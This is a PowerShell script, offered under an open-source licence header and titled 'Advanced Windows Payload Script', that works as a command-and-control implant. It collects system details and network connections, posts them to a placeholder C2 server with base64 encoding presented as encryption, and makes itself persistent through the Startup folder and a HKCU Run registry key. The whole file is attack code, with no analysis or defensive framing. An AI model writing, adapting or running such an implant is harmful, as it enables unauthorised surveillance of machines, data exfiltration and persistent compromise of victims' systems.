######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

# Advanced Windows Payload Script
$C2Server = "https://your-c2-server.com"
$AgentID = [guid]::NewGuid().ToString()

Function Encrypt-Data {
    param (
        [string]$Data
    )
    # Replace with actual key and encryption method
    return [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Data))
}

Function Decrypt-Data {
    param (
        [string]$Data
    )
    # Replace with actual key and decryption method
    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Data))
}

Function Write-Log {
    param (
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

Function Send-Data {
    param (
        [string]$Endpoint,
        [hashtable]$Data
    )
    $DataJson = $Data | ConvertTo-Json
    $EncryptedData = Encrypt-Data $DataJson
    $Url = "$C2Server/$Endpoint"
    $Response = Invoke-RestMethod -Uri $Url -Method Post -Body $EncryptedData -ContentType "application/json"
    return Decrypt-Data $Response
}

Function Gather-System-Info {
    $SystemInfo = Get-ComputerInfo | Select-Object CsName, WindowsVersion, WindowsBuildLabEx, CsManufacturer, CsModel
    return $SystemInfo
}

Function List-Network-Connections {
    $NetStat = netstat -an | Select-Object -Skip 4
    return $NetStat
}

Function Establish-Persistence {
    $ScriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\windows_payload.ps1"
    Copy-Item -Path "$MyInvocation.MyCommand.Path" -Destination $ScriptPath
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsPayload" -Value $ScriptPath
}

Function Main {
    Write-Log "Payload started. ID: $AgentID" "Cyan"
    
    $SystemInfo = Gather-System-Info
    $NetworkConnections = List-Network-Connections
    
    $Data = @{
        AgentID = $AgentID
        SystemInfo = $SystemInfo
        NetworkConnections = $NetworkConnections
    }
    
    Send-Data "report" $Data
    Establish-Persistence
}

Main
